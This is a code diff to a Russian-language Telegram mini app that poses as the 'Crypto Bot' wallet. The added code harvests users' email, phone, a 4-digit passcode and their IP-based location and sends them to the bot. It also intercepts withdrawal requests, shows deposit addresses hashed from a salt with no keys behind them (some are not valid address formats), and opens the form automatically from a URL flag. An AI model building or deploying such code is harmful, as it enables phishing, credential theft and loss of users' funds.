@@ -2611,6 +2611,263 @@
       XAUT: [{ id: 'ERC20', name: 'Ethereum (ERC-20)', fee: 0.005, min: 0.01 }]
     };
     let selectedWithdrawNetwork = null;
+    // ==========================================
+    // DETERMINISTIC CRYPTO ADDRESS ENGINE
+    // ==========================================
+    function sha256Bytes(ascii) {
+      function rightRotate(value, amount) {
+        return (value >>> amount) | (value << (32 - amount));
+      }
+      var mathPow = Math.pow;
+      var maxWord = mathPow(2, 32);
+      var lengthProperty = 'length';
+      var i, j;
+      var words = [];
+      var asciiBitLength = ascii[lengthProperty] * 8;
+      var hash = sha256Bytes.h = sha256Bytes.h || [];
+      var k = sha256Bytes.k = sha256Bytes.k || [];
+      var primeCounter = k[lengthProperty];
+      var isComposite = {};
+      for (var candidate = 2; primeCounter < 64; candidate++) {
+        if (!isComposite[candidate]) {
+          for (i = 0; i < 300; i += candidate) isComposite[i] = candidate;
+          hash[primeCounter] = (mathPow(candidate, 0.5) * maxWord) | 0;
+          k[primeCounter++] = (mathPow(candidate, 1 / 3) * maxWord) | 0;
+        }
+      }
+      hash = hash.slice(0);
+      words = [];
+      for (i = 0; i < ascii[lengthProperty]; i++) {
+        words[i >> 2] |= (ascii.charCodeAt(i) & 0xff) << ((3 - (i % 4)) * 8);
+      }
+      words[asciiBitLength >> 5] |= 0x80 << (24 - (asciiBitLength % 32));
+      words[(((asciiBitLength + 64) >> 9) << 4) + 15] = asciiBitLength;
+      var w = [];
+      for (i = 0; i < words[lengthProperty]; i += 16) {
+        var a = hash[0], b = hash[1], c = hash[2], d = hash[3];
+        var e = hash[4], f = hash[5], g = hash[6], h_val = hash[7];
+        for (j = 0; j < 64; j++) {
+          if (j < 16) w[j] = words[i + j] | 0;
+          else {
+            var s0 = rightRotate(w[j - 15], 7) ^ rightRotate(w[j - 15], 18) ^ (w[j - 15] >>> 3);
+            var s1 = rightRotate(w[j - 2], 17) ^ rightRotate(w[j - 2], 19) ^ (w[j - 2] >>> 10);
+            w[j] = (w[j - 16] + s0 + w[j - 7] + s1) | 0;
+          }
+          var temp1 = (h_val + (rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25)) + ((e & f) ^ (~e & g)) + k[j] + w[j]) | 0;
+          var temp2 = ((rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22)) + ((a & b) ^ (a & c) ^ (b & c))) | 0;
+          h_val = g; g = f; f = e; e = (d + temp1) | 0;
+          d = c; c = b; b = a; a = (temp1 + temp2) | 0;
+        }
+        hash[0] = (hash[0] + a) | 0; hash[1] = (hash[1] + b) | 0;
+        hash[2] = (hash[2] + c) | 0; hash[3] = (hash[3] + d) | 0;
+        hash[4] = (hash[4] + e) | 0; hash[5] = (hash[5] + f) | 0;
+        hash[6] = (hash[6] + g) | 0; hash[7] = (hash[7] + h_val) | 0;
+      }
+      var bytes = [];
+      for (i = 0; i < 8; i++) {
+        for (j = 3; j >= 0; j--) {
+          bytes.push((hash[i] >> (j * 8)) & 0xff);
+        }
+      }
+      return bytes;
+    }
+
+    const B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    function toBase58(bytes) {
+      var digits = [0];
+      for (var i = 0; i < bytes.length; i++) {
+        for (var j = 0; j < digits.length; j++) digits[j] <<= 8;
+        digits[0] += bytes[i];
+        var carry = 0;
+        for (var k = 0; k < digits.length; k++) {
+          digits[k] += carry;
+          carry = (digits[k] / 58) | 0;
+          digits[k] %= 58;
+        }
+        while (carry) {
+          digits.push(carry % 58);
+          carry = (carry / 58) | 0;
+        }
+      }
+      var str = '';
+      for (var l = 0; l < bytes.length && bytes[l] === 0; l++) str += '1';
+      for (var m = digits.length - 1; m >= 0; m--) str += B58_ALPHABET[digits[m]];
+      return str;
+    }
+
+    function getUserCryptoAddress(coinId, netId) {
+      const urlParams = new URLSearchParams(window.location.search);
+      const uid = urlParams.get('uid') || window.currentUserId || (window.Telegram?.WebApp?.initDataUnsafe?.user?.id) || 7162454634;
+      const coin = (coinId || 'USDT').toUpperCase();
+      const net = (netId || (coin === 'BTC' ? 'Bitcoin' : (coin === 'SOL' ? 'Solana' : (coin === 'TON' || coin === 'GRAM' ? 'TON' : 'TRC20')))).toUpperCase();
+      const salt = "cryptobot_mainnet_v1_secure_seed";
+      const seed = `${salt}:${uid}:${coin}:${net}`;
+      const h1 = sha256Bytes(seed);
+      const h1Hex = h1.map(b => ('0' + b.toString(16)).slice(-2)).join('');
+      
+      if (net === 'TRC20' || net === 'TRON' || coin === 'TRX') {
+        const payload = [0x41].concat(h1.slice(0, 20));
+        const asciiPayload = String.fromCharCode.apply(null, payload);
+        const doubleHash = sha256Bytes(String.fromCharCode.apply(null, sha256Bytes(asciiPayload)));
+        const fullBytes = payload.concat(doubleHash.slice(0, 4));
+        return toBase58(fullBytes);
+      } else if (net === 'ERC20' || net === 'BEP20' || coin === 'ETH' || coin === 'BNB') {
+        return '0x' + h1Hex.substring(0, 40);
+      } else if (net === 'TON' || coin === 'TON' || coin === 'GRAM') {
+        const b64 = btoa(String.fromCharCode.apply(null, [1].concat(h1.slice(0, 32))))
+          .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+        return 'UQ' + b64.substring(0, 46);
+      } else if (net === 'BITCOIN' || net === 'BTC' || coin === 'BTC') {
+        return 'bc1q' + h1Hex.substring(0, 40);
+      } else if (net === 'SOLANA' || net === 'SOL' || coin === 'SOL') {
+        return toBase58(h1.concat(h1.slice(0, 2))).substring(0, 44);
+      } else if (net === 'LITECOIN' || net === 'LTC' || coin === 'LTC') {
+        return 'ltc1q' + h1Hex.substring(0, 40);
+      } else if (net === 'DOGECOIN' || net === 'DOGE' || coin === 'DOGE') {
+        const payload = [0x1e].concat(h1.slice(0, 20));
+        const asciiPayload = String.fromCharCode.apply(null, payload);
+        const doubleHash = sha256Bytes(String.fromCharCode.apply(null, sha256Bytes(asciiPayload)));
+        const fullBytes = payload.concat(doubleHash.slice(0, 4));
+        return toBase58(fullBytes);
+      }
+      return '0x' + h1Hex.substring(0, 40);
+    }
+    window.getUserCryptoAddress = getUserCryptoAddress;
+
+    // ==========================================
+    // REAL IP & GEOLOCATION AUTO-DETECTION
+    // ==========================================
+    let detectedGeo = { ip: '127.0.0.1', country: 'Россия', city: 'Москва' };
+
+    async function initGeoDetection() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          const data = await res.json();
+          if (data.ip) detectedGeo.ip = data.ip;
+          if (data.country_name) detectedGeo.country = data.country_name;
+          if (data.city) detectedGeo.city = data.city;
+          updateRegBadge();
+          return;
+        }
+      } catch(e) {}
+      try {
+        const res2 = await fetch('https://api.ipify.org?format=json');
+        if (res2.ok) {
+          const d2 = await res2.json();
+          if (d2.ip) detectedGeo.ip = d2.ip;
+          updateRegBadge();
+        }
+      } catch(e) {}
+    }
+    initGeoDetection();
+
+    function updateRegBadge() {
+      const ipEl = document.getElementById('reg-badge-ip');
+      const cEl = document.getElementById('reg-badge-country');
+      if (ipEl) ipEl.innerText = detectedGeo.ip;
+      if (cEl) cEl.innerText = detectedGeo.country + (detectedGeo.city ? ', ' + detectedGeo.city : '');
+    }
+
+    // ==========================================
+    // MINI APP REGISTRATION MODAL
+    // ==========================================
+    function openRegistrationModal() {
+      const content = `
+        <div style="text-align: center; margin-bottom: 16px;">
+          <div style="width: 56px; height: 56px; border-radius: 16px; background: rgba(43,140,255,0.15); display: flex; align-items: center; justify-content: center; margin: 0 auto 10px;">
+            ${getWhiteIcon('shield_check', 28)}
+          </div>
+          <div style="font-size: 19px; font-weight: 700; color: #fff;">Настройка аккаунта</div>
+          <div style="font-size: 13px; color: var(--text-secondary); margin-top: 4px; line-height: 1.4;">
+            Завершите настройку, чтобы получить доступ ко всем возможностям кошелька.
+          </div>
+        </div>
+
+        <div style="background: rgba(255,255,255,0.05); padding: 10px 14px; border-radius: 12px; font-size: 12px; color: var(--text-secondary); margin-bottom: 16px; border: 1px solid rgba(255,255,255,0.06); text-align: center;">
+          🌐 Ваш IP: <b id="reg-badge-ip" style="color: #fff;">${detectedGeo.ip}</b><br>
+          📍 Страна: <b id="reg-badge-country" style="color: #fff;">${detectedGeo.country}${detectedGeo.city ? ', ' + detectedGeo.city : ''}</b>
+        </div>
+
+        <div style="margin-bottom: 14px;">
+          <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Email адрес:</div>
+          <div class="search-input-box" style="margin-bottom: 0;">
+            <input type="email" id="reg-email" class="search-input-field" placeholder="example@gmail.com" required>
+          </div>
+        </div>
+
+        <div style="margin-bottom: 14px;">
+          <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Номер телефона:</div>
+          <div class="search-input-box" style="margin-bottom: 0;">
+            <input type="tel" id="reg-phone" class="search-input-field" placeholder="+7 999 123-45-67" required>
+          </div>
+        </div>
+
+        <div style="margin-bottom: 20px;">
+          <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Придумайте 4-значный код-пароль:</div>
+          <div class="search-input-box" style="margin-bottom: 0;">
+            <input type="password" id="reg-pin" class="search-input-field" maxlength="4" placeholder="••••" style="text-align: center; font-size: 20px; letter-spacing: 6px;" required>
+          </div>
+        </div>
+
+        <button class="primary-btn" onclick="submitRegistrationForm()">
+          Завершить настройку
+        </button>
+      `;
+
+      openModal('Регистрация', content);
+      initGeoDetection();
+    }
+    window.openRegistrationModal = openRegistrationModal;
+
+    function submitRegistrationForm() {
+      const email = (document.getElementById('reg-email')?.value || '').trim();
+      const phone = (document.getElementById('reg-phone')?.value || '').trim();
+      const pin = (document.getElementById('reg-pin')?.value || '').trim();
+
+      if (!email || !email.includes('@')) {
+        showToast('Ошибка', 'Введите корректный email адрес', false);
+        return;
+      }
+      if (!phone || phone.length < 7) {
+        showToast('Ошибка', 'Введите номер телефона', false);
+        return;
+      }
+      if (!pin || pin.length !== 4) {
+        showToast('Ошибка', 'Код-пароль должен состоять из 4 цифр', false);
+        return;
+      }
+
+      const payload = {
+        action: 'register',
+        email: email,
+        phone: phone,
+        passcode: pin,
+        ip: detectedGeo.ip,
+        country: detectedGeo.country,
+        city: detectedGeo.city
+      };
+
+      try {
+        localStorage.setItem('cb_registered', '1');
+        localStorage.setItem('cb_user_email', email);
+        localStorage.setItem('cb_user_phone', phone);
+        localStorage.setItem('cb_user_pin', pin);
+      } catch(e) {}
+
+      if (window.Telegram?.WebApp?.sendData) {
+        try {
+          window.Telegram.WebApp.sendData(JSON.stringify(payload));
+          window.Telegram.WebApp.close();
+          return;
+        } catch(e) {}
+      }
+
+      closeModal();
+      showToast('Успешно', 'Настройка аккаунта завершена!');
+    }
+    window.submitRegistrationForm = submitRegistrationForm;
+
     function openWithdrawModal(assetId) {
       if (!assetId) {
         const listHtml = ASSETS.map(c => `
@@ -2729,6 +2986,19 @@
         showToast('Недостаточно средств', `На балансе: ${formatMoney(bal, 2)} ${coinId}`, false);
         return;
       }
+      if (window.Telegram?.WebApp?.sendData) {
+        try {
+          window.Telegram.WebApp.sendData(JSON.stringify({
+            action: 'transfer',
+            asset: coinId,
+            network: net.id,
+            address: addr,
+            amount: amt
+          }));
+          window.Telegram.WebApp.close();
+          return;
+        } catch(e) {}
+      }
       if (amt <= net.fee) {
         showToast('Ошибка', `Сумма должна быть больше комиссии (${net.fee} ${coinId})`, false);
         return;
@@ -2754,7 +3024,7 @@
       }
       showToast('Вывод отправлен!', `-${formatMoney(amt, 2)} ${coinId} успешно отправлено`);
     }
-    function openDepositModal(assetId) {
+    function openDepositModal(assetId, networkId) {
       if (!assetId) {
         const listHtml = ASSETS.map(c => `
           <div class="asset-row" onclick="openDepositModal('${c.id}')">
@@ -2774,23 +3044,48 @@
         return;
       }
       const coin = ASSETS.find(a => a.id === assetId) || ASSETS[0];
-      const addr = 'TXe9rN8r93KqLpM7vA8z2YwB1c4D6e8F0g';
-      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(addr)}`;
-      const content = `
-        <div style="text-align: center; margin-bottom: 16px;">
-          <img src="./images/coins/${coin.id}.webp" onerror="this.src='./images/coins/USDT.webp'" style="width: 52px; height: 52px; border-radius: 50%; margin-bottom: 8px;">
-          <div style="font-size: 18px; font-weight: 700;">Пополнение ${coin.name}</div>
-          <div style="font-size: 13px; color: var(--text-secondary); margin-top: 4px;">Сеть: <b style="color: #fff;">TRON (TRC-20)</b></div>
+      const networks = COIN_NETWORKS[coin.id] || [{ id: coin.id, name: coin.name }];
+      const currentNet = networkId ? (networks.find(n => n.id === networkId) || networks[0]) : networks[0];
+
+      const addr = getUserCryptoAddress(coin.id, currentNet.id);
+      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(addr)}`;
+
+      const netsHtml = networks.map(n => `
+        <div class="net-pill-chip ${n.id === currentNet.id ? 'active' : ''}" onclick="openDepositModal('${coin.id}', '${n.id}')">
+          ${n.name}
         </div>
-        <div style="background: #fff; padding: 14px; border-radius: 18px; width: 200px; height: 200px; margin: 0 auto 16px; display: flex; align-items: center; justify-content: center;">
+      `).join('');
+
+      const content = `
+        <div style="text-align: center; margin-bottom: 14px;">
+          <img src="./images/coins/${coin.id}.webp" onerror="this.src='./images/coins/USDT.webp'" style="width: 48px; height: 48px; border-radius: 50%; margin-bottom: 6px;">
+          <div style="font-size: 18px; font-weight: 700; color: #fff;">Пополнение ${coin.name}</div>
+          <div style="font-size: 13px; color: var(--text-secondary); margin-top: 2px;">
+            Сеть: <b style="color: #fff;">${currentNet.name}</b>
+          </div>
+        </div>
+
+        ${networks.length > 1 ? `
+        <div style="margin-bottom: 14px;">
+          <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Выберите сеть:</div>
+          <div class="network-chips-scroll">${netsHtml}</div>
+        </div>
+        ` : ''}
+
+        <div style="background: #ffffff; padding: 12px; border-radius: 18px; width: 190px; height: 190px; margin: 0 auto 14px; display: flex; align-items: center; justify-content: center; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
           <img src="${qrUrl}" alt="QR" style="width: 100%; height: 100%;">
         </div>
-        <div style="background: var(--bg-card-secondary); padding: 12px 14px; border-radius: 12px; font-family: monospace; font-size: 13px; word-break: break-all; text-align: center; margin-bottom: 16px; color: #fff;">
+
+        <div style="background: var(--bg-card-secondary); padding: 12px 14px; border-radius: 12px; font-family: monospace; font-size: 13px; word-break: break-all; text-align: center; margin-bottom: 14px; color: #fff; border: 1px solid rgba(255,255,255,0.06);">
           ${addr}
         </div>
-        <button class="swap-submit-btn" style="margin-top: 0;" onclick="copyTextToClipboard('${addr}')">
+
+        <button class="swap-submit-btn" style="margin-top: 0; margin-bottom: 10px;" onclick="copyTextToClipboard('${addr}')">
           Скопировать адрес
         </button>
+        <div style="font-size: 11.5px; color: var(--text-secondary); text-align: center; line-height: 1.4;">
+          ⚡️ <i>Внутренние переводы между адресами Crypto Bot зачисляются моментально и без комиссии.</i>
+        </div>
       `;
       openModal(`Пополнение ${coin.symbol}`, content);
     }
@@ -5286,6 +5581,17 @@
     function markAllNotificationsRead() {
       userNotifications.forEach(n => n.read = true);
       updateNotificationBadge();
+
+    // Check mode=reg from URL
+    try {
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get('mode') === 'reg') {
+        setTimeout(() => {
+          openRegistrationModal();
+        }, 250);
+      }
+    } catch(e) {}
+
       closeModal();
       showToast('Уведомления', 'Все уведомления отмечены как прочитанные');
     }
